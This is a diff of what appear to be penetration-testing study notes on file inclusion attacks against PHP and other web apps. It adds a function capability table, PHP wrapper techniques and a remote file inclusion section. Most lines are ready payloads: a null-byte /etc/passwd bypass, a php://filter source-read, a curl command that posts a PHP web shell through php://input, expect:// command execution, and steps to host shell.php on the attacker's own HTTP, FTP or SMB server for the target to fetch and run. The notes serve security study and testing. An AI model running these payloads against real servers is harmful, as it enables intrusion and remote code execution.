@@ -1,5 +1,26 @@
 # File Inclusion
 
+## Read vs Execute
+
+| **PHP**                      |     |     |     |
+| ---------------------------- | :-: | :-: | :-: |
+| `include()`/`include_once()` |  ✅  |  ✅  |  ✅  |
+| `require()`/`require_once()` |  ✅  |  ✅  |  ❌  |
+| `file_get_contents()`        |  ✅  |  ❌  |  ✅  |
+| `fopen()`/`file()`           |  ✅  |  ❌  |  ❌  |
+| **NodeJS**                   |     |     |     |
+| `fs.readFile()`              |  ✅  |  ❌  |  ❌  |
+| `fs.sendFile()`              |  ✅  |  ❌  |  ❌  |
+| `res.render()`               |  ✅  |  ✅  |  ❌  |
+| **Java**                     |     |     |     |
+| `include`                    |  ✅  |  ❌  |  ❌  |
+| `import`                     |  ✅  |  ✅  |  ✅  |
+| **.NET**                     |     |     |     |
+| `@Html.Partial()`            |  ✅  |  ❌  |  ❌  |
+| `@Html.RemotePartial()`      |  ✅  |  ❌  |  ✅  |
+| `Response.WriteFile()`       |  ✅  |  ❌  |  ❌  |
+| `include`                    |  ✅  |  ✅  |  ✅  |
+
 ## Local File Inclusion (LFI) <a href="#local-file-inclusion-lfi" id="local-file-inclusion-lfi"></a>
 
 * Common place we usually find LFI within is templating engines.
@@ -73,31 +94,6 @@ if(req.query.language) {
 
 </details>
 
-<details>
-
-<summary><strong>Read vs Execute</strong></summary>
-
-| **PHP**                      |     |     |     |
-| ---------------------------- | :-: | :-: | :-: |
-| `include()`/`include_once()` |  ✅  |  ✅  |  ✅  |
-| `require()`/`require_once()` |  ✅  |  ✅  |  ❌  |
-| `file_get_contents()`        |  ✅  |  ❌  |  ✅  |
-| `fopen()`/`file()`           |  ✅  |  ❌  |  ❌  |
-| **NodeJS**                   |     |     |     |
-| `fs.readFile()`              |  ✅  |  ❌  |  ❌  |
-| `fs.sendFile()`              |  ✅  |  ❌  |  ❌  |
-| `res.render()`               |  ✅  |  ✅  |  ❌  |
-| **Java**                     |     |     |     |
-| `include`                    |  ✅  |  ❌  |  ❌  |
-| `import`                     |  ✅  |  ✅  |  ✅  |
-| **.NET**                     |     |     |     |
-| `@Html.Partial()`            |  ✅  |  ❌  |  ❌  |
-| `@Html.RemotePartial()`      |  ✅  |  ❌  |  ✅  |
-| `Response.WriteFile()`       |  ✅  |  ❌  |  ❌  |
-| `include`                    |  ✅  |  ✅  |  ✅  |
-
-</details>
-
 #### Basic LFI <a href="#basic-lfi" id="basic-lfi"></a>
 
 * Able to change the **absolute** file path being pulled to read the content of a different local file.
@@ -162,18 +158,18 @@ if(req.query.language) {
     * PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string.
     * **Bypass**: `/etc/passwd%00`
 
-### PHP Filters <a href="#php-filters" id="php-filters"></a>
+### PHP Wrappers <a href="#php-filters" id="php-filters"></a>
 
 * Utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.
 * PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams.
-* #### Input Filters <a href="#input-filters" id="input-filters"></a>
+* #### Input Filters Wrapper <a href="#input-filters" id="input-filters"></a>
   * [PHP Filters](https://www.php.net/manual/en/filters.php) allow us to transform stream data by applying specific filters during stream operations.
   * To access the PHP filter wrapper with `php://filter/` to apply filters to a resource.
   * The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`.&#x20;
   * Read parameter has four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
   * Fuzzing for PHP Files :  `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:/FUZZ.php`&#x20;
   * **Payload**: `php://filter/read=convert.base64-encode/resource=config`&#x20;
-  * eg: `http://<SERVER_IP>:/index.php?language=php://filter/read=convert.base64-encode/resource=config`
+  * eg: `http://<SERVER_IP>:/index.php?language=php://filter/read=convert.base64-encode/resource=config`&#x20;
 * #### Data Wrapper <a href="#data" id="data"></a>
   * Used to include external data, including PHP code.
   * Data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.
@@ -187,10 +183,47 @@ if(req.query.language) {
   * The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.
   * The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data.
   * So, the vulnerable parameter must accept POST requests for this attack to work.
-  * &#x20;The `input` wrapper also depends on the `allow_url_include`&#x20;
+  * &#x20;The `input` wrapper also depends on the `allow_url_include` .
+  * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
   * **Payload**: `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:/index.php?language=php://input&cmd=id" | grep uid`&#x20;
   * To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
   * #### Expect Wrapper <a href="#expect" id="expect"></a>
+    * The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams.&#x20;
+    * Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.
+    * However, `expect` is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality.
+    * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
+    * **Syntax**: `extension=expect`&#x20;
+    * **Payload**: `expect://id`
+    * eg:  `curl -s "http://<SERVER_IP>:/index.php?language=expect://id"`
+
+## Remote File Inclusion (RFI) <a href="#remote-file-inclusion-rfi" id="remote-file-inclusion-rfi"></a>
+
+* Include remote files, if the vulnerable function allows the inclusion of remote URLs.
+* This allows two main benefits:
+  1. Enumerating local-only ports and web applications (i.e. SSRF)
+  2. Gaining remote code execution by including a malicious script that we host
+
+### Verify RFI <a href="#verify-rfi" id="verify-rfi"></a>
+
+* Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled
+* PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
+* More reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content.
+* eg: `http://127.0.0.1:80/index.php`  and other remote URL's
+
+### Remote Code Execution <a href="#remote-code-execution-with-rfi" id="remote-code-execution-with-rfi"></a>
+
+* Create a malicious script in the language of the web application.
+* eg: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`&#x20;
+* Host this script and include it through the RFI vulnerability
+  * **HTTP**
+    * `sudo python3 -m http.server <PORT>`&#x20;
+    * **Payload**: `http://<SERVER_IP>:/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=id`
+  * **FTP**
+    * `sudo python -m pyftpdlib -p 21`&#x20;
+    * **Payload**: `http://<SERVER_IP>:/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`&#x20;
+  * **SMB** <sup><sub>(windows server)<sub></sup>
+    * `impacket-smbserver -smb2support share $(pwd)` <sup><sub>(anonymous authentication)<sub></sup>
+    * **Payload:** `http://<SERVER_IP>:/index.php?language=\<OUR_IP>\share\shell.php&cmd=whoami`
 
 
 
